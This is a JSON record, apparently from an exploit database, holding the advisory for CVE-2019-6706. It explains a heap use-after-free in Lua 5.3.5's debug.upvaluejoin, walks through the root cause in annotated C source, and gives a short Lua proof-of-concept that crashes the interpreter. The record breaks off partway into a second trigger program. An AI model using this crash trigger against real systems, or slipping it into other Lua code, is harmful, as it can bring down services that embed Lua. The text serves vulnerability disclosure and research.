{
    "text": "ecve : CVE-2019-6706 ， title : Lua 5.3.5 - 'debug.upvaluejoin' Use After Free - Multiple dos Exploit ， verified : Not Verified ， exploit_detail :  # Exploit Title : Lua 5.3.5 ，  # Exploit Author : Fady Mohamed Osman (  ，  # Exploit-db :  ，  # Blog :  ，  # Date : Jan. 10th 2019 ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 5.3.5 ，  # CVE ID : CVE-2019-6706 ， During a fuzz session using \"AFL\" , I found a heap use after free in lua ， 5.3.5 , after analysis of the crash I found the root cause of the ， vulnerability , here's the details. ， The function `lua_upvaluejoin` in file lapi.c at line 1287 suffers from a ， use after free bug when supplied the same function for parameter f1 and f2 ， and the same upvalue index , additionally I found that the bug is only ， triggered when the upvalue is closed , this happens because the ， `luaC_upvdeccount` function found in file lgc.c at line 678 will decrement ， the refcount and then free the upvalue if the refcount is zero and if the ， upvalue is closed. ， See the comments below for more explanation. ， LUA_API void lua_upvaluejoin ( lua_State * L , int fidx1 , int n1 ,  ， int fidx2 , int n2 ) { ， LClosure * f1 ;  ， UpVal up1 = getupvalref ( L , fidx1 , n1 , &f1 )  ;  ， UpVal up2 = getupvalref ( L , fidx2 , n2 , NULL )  ;  ， luaC_upvdeccount ( L ,  * up1 )  ; //Will delete up1 ，  * up1 = * up2 ; //up1 is up2 because it's the same upvalue and now it's ， freed. ，  (  * up1 ) ->refcount++ ; //up1 is freed , yet it's used here. ， luaC_upvalbarrier ( L ,  * up1 )  ;  ， - To trigger the bug simply use a lua program like this ( this one will ， crash )  :  ， f=load ( function (  ) end )  ， interesting={} ， interesting [ 0 ] =string.rep ( \"A\" , 512 )  ， debug.upvaluejoin ( f , 1 , f , 1 )  ， - Another program that will not crash ( unless you compile with ， -fsanitize=address )  :  ， local x = {} ， f = function (  ) ",
    "time": "2019-01-25"
}